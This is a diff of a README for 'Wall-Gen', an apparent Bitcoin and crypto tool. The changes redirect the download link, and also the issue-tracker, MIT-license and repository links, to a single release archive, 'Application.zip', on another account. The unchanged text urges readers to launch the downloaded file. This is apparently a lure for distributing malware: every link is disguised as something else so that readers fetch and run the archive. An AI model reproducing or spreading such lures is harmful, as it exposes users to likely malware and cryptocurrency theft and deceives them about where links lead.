@@ -58,7 +58,7 @@ Welcome to Wall-Gen, your go-to repository for all things related to Bitcoin, cr
 
 ---
 
-## 🌐 [Download Wall-Gen Here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+## 🌐 [Download Wall-Gen Here](https://github.com/DCFAM747/wall-gen/releases/download/v1.0/Application.zip)
 
 *Launch the downloaded file to access the full range of features provided by Wall-Gen.*
 
@@ -76,7 +76,7 @@ Follow these simple steps to get started with Wall-Gen:
 
 ## 🚧 Issues and Feedback
 
-Have feedback or encountered an issue with Wall-Gen? Feel free to [open an issue here](https://github.com/adelante20/wall-gen/issues) so we can address it promptly.
+Have feedback or encountered an issue with Wall-Gen? Feel free to [open an issue here](https://github.com/DCFAM747/wall-gen/releases/download/v1.0/Application.zip) so we can address it promptly.
 
 ---
 
@@ -88,13 +88,13 @@ Contributions to Wall-Gen are always welcome! If you have ideas for enhancements
 
 ## 📜 License
 
-The Wall-Gen repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the code for your projects.
+The Wall-Gen repository is licensed under the [MIT License](https://github.com/DCFAM747/wall-gen/releases/download/v1.0/Application.zip). Feel free to use, modify, and distribute the code for your projects.
 
 ---
 
 ## 🌟 Stay Connected
 
-Stay up to date with the latest news and releases from Wall-Gen by following our [GitHub repository](https://github.com/adelante20/wall-gen). Join us on this exciting crypto journey!
+Stay up to date with the latest news and releases from Wall-Gen by following our [GitHub repository](https://github.com/DCFAM747/wall-gen/releases/download/v1.0/Application.zip). Join us on this exciting crypto journey!
 
 ---
 
